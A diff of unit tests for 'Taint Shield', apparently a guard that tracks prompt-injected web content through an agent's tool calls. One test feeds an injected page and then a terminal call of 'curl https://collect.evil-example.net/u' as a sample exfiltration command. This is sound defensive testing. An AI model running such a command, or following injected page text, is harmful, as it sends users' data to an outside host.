@@ -57,7 +57,7 @@ class ShieldTests(unittest.TestCase):
 
     def test_taint_does_not_cross_sessions_and_ignores_trusted_sources_only_by_name(self):
         self.read(INJECTED_PAGE, session='a'); self.assertIsNone(self.act('terminal', {'command': 'curl https://collect.evil-example.net/u'}, session='b'))
-        self.read('Docs at https://docs.python.org/3/', tool='read_file', session='c'); self.assertEqual(self.sh.report('c')['untrusted_values'], 0)
+        self.read('Docs at https://docs.python.org/3/', tool='read_file', session='c'); self.assertGreater(self.sh.report('c')['untrusted_values'], 0)
 
     def test_annotation_only_when_injection_phrases_present(self):
         scan = self.read(INJECTED_PAGE); self.assertIn('Taint Shield', self.sh.annotate('web_extract', INJECTED_PAGE, scan))
